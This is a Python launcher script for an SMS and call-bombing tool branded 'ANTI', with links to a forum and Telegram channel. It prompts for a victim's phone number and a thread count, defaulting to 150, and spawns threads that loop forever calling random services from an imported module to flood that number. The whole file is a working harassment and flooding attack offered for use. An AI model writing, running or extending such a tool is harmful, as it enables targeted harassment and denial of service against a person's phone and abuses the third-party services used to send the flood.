import sys, os, pyfiglet, config
from StructService import Distribution_Service
from threading import Thread
from colorama import Fore



class Starter:
	def __init__(self):
		self.attack_number_phone = Distribution_Service()
		os.system('clear')

	def startAttack(self, phone):
		self.attack_number_phone.phone(phone)

		while True:
		    try:
		        self.attack_number_phone.random_service()
		    except Exception as ex:
		    	print(ex)


	def start(self):
		print(Fore.YELLOW + pyfiglet.figlet_format("ANTI"))
		print('============')
		print(Fore.GREEN + 'Forum - https://arel.pw')
		print(Fore.GREEN + 'Telegram - https://t.me/ARELDEV_CHANNEL')
		print(Fore.GREEN + f'Services - {len(config.services)}')
		print(Fore.YELLOW + '============')
		phone = input('Phone: ')
		print('============')
		try:
			self.attack_number_phone.phone(phone)
		except:
			print(Fore.RED + 'Неверный формат ввода.\nВведите номер в формате +xxxxxxxxxxxx')
			return self.start()

		try:
			threads = int(input('Threads: '))	
		except:
			threads = 150
		print('============')

		for i in range(threads):
			th = Thread(target=self.startAttack, args=(phone,))
			th.start()



starting = Starter()
starting.start()




